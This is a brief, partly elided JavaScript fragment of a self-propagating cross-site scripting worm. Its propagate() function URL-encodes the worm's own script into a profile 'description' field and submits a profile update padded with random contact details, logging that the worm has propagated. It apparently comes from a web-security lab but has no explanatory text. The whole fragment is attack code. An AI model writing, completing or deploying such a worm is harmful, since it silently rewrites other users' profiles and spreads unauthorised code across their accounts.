...
function propagate() {
  ...
  // Getting the script with id 'worm', which is the wormcode
  // and adding the code in description
  ...
  const wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
  const description = "&description=" + wormCode;
  ...
  const others = `${briefDescription}&contactemail=${randomString(
    6
  )}@gmail.com&${description}${uid}&interests=${randomString(
    6
  )}&location=${randomString(6)}&mobile=${randomString(
    6
  )}${name}&phone=${randomString(6)}&skills=update&twitter=${randomString(
    6
  )}&website=www.${randomString(6)}.com`;
  ...
  console.log("Automatically Propageted Wormcode");
}
